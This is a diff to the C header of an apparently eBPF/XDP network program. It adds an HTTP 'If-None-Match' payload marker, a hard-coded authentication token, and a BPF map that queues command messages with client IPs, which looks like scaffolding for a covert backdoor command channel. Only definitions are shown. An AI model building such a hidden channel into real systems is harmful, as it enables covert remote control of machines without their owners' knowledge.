@@ -13,25 +13,36 @@
 #include <linux/ip.h>
 #include <linux/tcp.h>
 
-#include "crypto.h"
-
 #define BUF_SIZE 64
+#define PAYLOAD_HEADER "If-None-Match: "
+#define HTTP_PORT 80
+#define CMD_QUEQUE_SIZE 16
+#define CLIENT_IP_OFFSET 22
+#define EXTRA_HEADER_SIZE 30
+#define IP_BUF_SIZE 33
+#define AUTH_HEADER (unsigned char*)"lo7ct"
+#define AUTH_HEADER_SIZE 5
 
 struct hdr_cursor
 {
   void *pos;
 };
 
-struct
+struct cmd_details
 {
-  __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
-  __type(key, __u32);
-  __type(value, long);
-  __uint(max_entries, 1);
-} rxcnt SEC(".maps");
+  unsigned char message[BUF_SIZE];
+  unsigned char ip[IP_BUF_SIZE];
+};
 
-// #ifndef memcpy
-// #define memcpy(dest, src, n) __builtin_memcpy((dest), (src), (n))
+struct bpf_map_def SEC("maps") cmd_map_array = {
+  .type        = BPF_MAP_TYPE_ARRAY,
+  .key_size    = sizeof(__u32),
+  .value_size  = sizeof(struct cmd_details),
+  .max_entries = CMD_QUEQUE_SIZE,
+};
+
+// #ifndef lock_xadd
+// #define lock_xadd(ptr, val)	((void) __sync_fetch_and_add(ptr, val))
 // #endif
 
 #endif
